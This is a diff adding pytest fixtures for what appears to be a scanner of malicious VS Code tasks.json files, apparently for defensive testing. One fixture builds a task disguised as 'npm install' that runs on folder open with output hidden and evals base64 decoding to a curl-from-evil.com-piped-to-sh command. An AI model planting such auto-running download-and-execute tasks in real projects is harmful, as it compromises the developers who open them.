@@ -101,3 +101,64 @@ def malformed_package_json(tmp_path):
     pkg = tmp_path / "package.json"
     pkg.write_text('{"name": "broken", "scripts": {')
     return tmp_path
+
+
+# VS Code tasks fixtures
+@pytest.fixture
+def contagious_interview_task(tmp_path):
+    """Realistic Contagious Interview attack (auto-executing malicious task)."""
+    vscode_dir = tmp_path / ".vscode"
+    vscode_dir.mkdir()
+    tasks_file = vscode_dir / "tasks.json"
+    tasks_file.write_text(
+        json.dumps({
+            "version": "2.0.0",
+            "tasks": [{
+                "label": "npm install",
+                "type": "shell",
+                "command": "node -e \"eval(Buffer.from('Y3VybCBodHRwOi8vZXZpbC5jb20vbWFsd2FyZS5zaCB8IHNo','base64').toString())\"",
+                "runOptions": {"runOn": "folderOpen"},
+                "presentation": {"reveal": "never"},
+            }],
+        })
+    )
+    return tmp_path
+
+
+@pytest.fixture
+def clean_vscode_tasks(tmp_path):
+    """Benign VS Code tasks."""
+    vscode_dir = tmp_path / ".vscode"
+    vscode_dir.mkdir()
+    tasks_file = vscode_dir / "tasks.json"
+    tasks_file.write_text(
+        json.dumps({
+            "version": "2.0.0",
+            "tasks": [{"label": "build", "type": "shell", "command": "npm run build"}],
+        })
+    )
+    return tmp_path
+
+
+@pytest.fixture
+def vscode_tasks_with_comments(tmp_path):
+    """VS Code tasks.json with JSONC comments."""
+    vscode_dir = tmp_path / ".vscode"
+    vscode_dir.mkdir()
+    tasks_file = vscode_dir / "tasks.json"
+    tasks_file.write_text(
+        '''
+        {
+            // Configuration version
+            "version": "2.0.0",
+            /* Task definitions */
+            "tasks": [
+                {
+                    "label": "test", // Run tests
+                    "command": "npm test"
+                }
+            ]
+        }
+        '''
+    )
+    return tmp_path
